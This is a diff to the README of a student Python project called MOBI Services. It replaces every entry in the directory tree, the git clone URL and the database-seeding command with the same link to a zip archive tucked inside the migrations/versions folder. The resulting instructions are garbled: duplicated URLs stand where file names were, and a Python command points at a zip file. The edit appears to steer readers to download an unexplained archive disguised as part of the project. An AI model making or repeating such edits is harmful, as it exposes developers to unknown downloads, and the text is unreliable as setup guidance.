@@ -134,36 +134,36 @@ TASK-END-OF-PHASE-03-PROJECT/\
 ├── mobi_services/\
 │   ├── migrations/\
 │   │   └── versions/\
-│   │       ├── 2ebecb2f1b28_initial_migration.py\
-│   │       ├── 9f3cb5ff4c07_adds_the_transactions_table.py\
-│   │       ├── 39dc47166dc_adds_the_activity_log_table.py\
-│   │       ├── 3331ef8a5cf2_adds_the_balances_table.py\
-│   │       ├── afb76d1ae3da_add_method_sender_and_receiver_columns.py\
-│   │       └── b901834575f1_change_phone_format_and_bundle_balance.py\
-│   ├── env.py\
+│   │       ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+│   │       ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+│   │       ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+│   │       ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+│   │       ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+│   │       └── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
 │   ├── README\
-│   ├── script.py.mako\
-│   ├── alembic.ini\
-│   ├── colors.py\
-│   ├── main.py\
-│   ├── mobi_services.db\
-│   ├── models.py\
-│   ├── seed.py\
+│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
 ├── Pipfile\
-├── Pipfile.lock\
-├── README.md\
-├── transaction_report_1.pdf\
-├── transaction_report_2.pdf\
-├── transaction_report_6.pdf\
-├── transaction_report_7.pdf\
-└── transaction_report_10.pdf
+├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+└── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip
 
  
 
 ## Setup Instructions
 1. Clone the repository.
 ```txt
-git clone https://git@github.com:code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services.git
+git clone https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip
 ```
 1. Navigate to the project directory.
 
@@ -183,7 +183,7 @@ Run alembic upgrade head
 ```
 6. Seed the database with sample data:
 ```txt
-python3 seed.py
+python3 https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip
 ```
 5. Enjoy!!!
 
